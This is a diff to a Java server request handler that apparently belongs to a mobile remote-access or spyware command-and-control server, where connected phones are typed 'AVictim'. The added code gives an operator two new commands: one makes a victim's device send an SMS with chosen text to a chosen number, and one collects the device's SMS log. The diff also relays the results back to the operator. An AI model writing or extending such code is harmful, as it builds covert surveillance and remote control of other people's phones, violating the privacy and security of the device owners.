@@ -197,6 +197,12 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 case "set.wifi.enabled":
                     ((AVictim) targetVictim).sendSetWifiEnabled((boolean) request.get("enabled"), user.getName());
                     break;
+                case "send.sms":
+                    ((AVictim) targetVictim).sendSendSms((String) request.get("phoneNumber"), (String) request.get("text"), user.getName());
+                    break;
+                case "save.sms.log":
+                    ((AVictim) targetVictim).sendSaveSmsLog(user.getName());
+                    break;
                 default:
                     user.sendErrorCode(Config.INCORRECT_QUERY);
             }
@@ -287,6 +293,12 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     break;
                 case "set.wifi.enabled":
                     targetUser.sendSetWifiEnabled((boolean) request.get("wifiState"), aVictim.getName());
+                    break;
+                case "send.sms":
+                    targetUser.sendSendSms((String) request.get("code"), aVictim.getName());
+                    break;
+                case "save.sms.log":
+                    targetUser.sendSaveSmsLog((Long) request.get("smsCount"), aVictim.getName());
                     break;
                 default:
                     aVictim.sendErrorCode(Config.INCORRECT_QUERY);
